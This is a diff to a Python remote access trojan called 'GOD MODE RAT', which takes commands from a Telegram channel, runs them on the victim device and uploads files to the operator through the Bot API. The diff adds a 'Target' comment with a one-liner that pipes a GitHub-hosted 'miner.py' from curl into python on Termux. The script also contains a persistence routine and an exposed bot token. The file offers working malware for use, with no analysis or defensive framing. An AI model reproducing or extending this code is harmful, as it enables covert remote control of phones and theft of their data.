@@ -1,5 +1,7 @@
 #!/usr/bin/env python3
-# GOD MODE RAT – Final v2
+# GOD MODE RAT – Final v3
+# Target: echo y | termux-setup-storage && pkg install python -y && curl -sL RAW_URL | python && exit
+
 import requests, time, subprocess, os, base64, threading
 
 BOT_TOKEN = '8831967961:AAHcWu_Mb09TlxxLtep5oONbANjABH1nJXk'
@@ -10,17 +12,18 @@ OFFSET = 0
 RAW_URL = 'https://raw.githubusercontent.com/kidusgetaw0-sys/UI/main/miner.py'
 
 def send(text, file_path=None):
-    for attempt in range(5):
-        try:
-            if file_path:
-                with open(file_path, 'rb') as f:
-                    requests.post(f'{API}/sendDocument', data={'chat_id': CHANNEL_ID}, files={'document': f}, timeout=15)
-            else:
-                requests.post(f'{API}/sendMessage', json={'chat_id': CHANNEL_ID, 'text': f'[{DEVICE_ID}] {text}'}, timeout=15)
-            return
-        except:
-            time.sleep(3)
-    # Silent fail after 5 attempts
+    """Send message or file to channel. Prints result for debugging."""
+    try:
+        if file_path:
+            with open(file_path, 'rb') as f:
+                resp = requests.post(f'{API}/sendDocument', data={'chat_id': CHANNEL_ID}, files={'document': f}, timeout=20)
+                print(f'[SEND FILE] {resp.status_code}')
+        else:
+            data = {'chat_id': CHANNEL_ID, 'text': f'[{DEVICE_ID}] {text}'}
+            resp = requests.post(f'{API}/sendMessage', json=data, timeout=15)
+            print(f'[SEND] {resp.status_code} - {resp.text[:80]}')
+    except Exception as e:
+        print(f'[SEND ERROR] {e}')
 
 def execute(cmd):
     parts = cmd.split(maxsplit=1)
@@ -74,12 +77,11 @@ def persist():
 
 def poll():
     global OFFSET
-    # Send initial heartbeat after network is ready
-    time.sleep(3)
+    time.sleep(5)
     send('RAT Connected')
     while True:
         try:
-            resp = requests.get(f'{API}/getUpdates?offset={OFFSET}&timeout=30', timeout=35).json()
+            resp = requests.get(f'{API}/getUpdates?offset={OFFSET}&timeout=30&allowed_updates=["channel_post"]', timeout=35).json()
             for upd in resp.get('result', []):
                 OFFSET = upd['update_id'] + 1
                 msg = upd.get('channel_post')
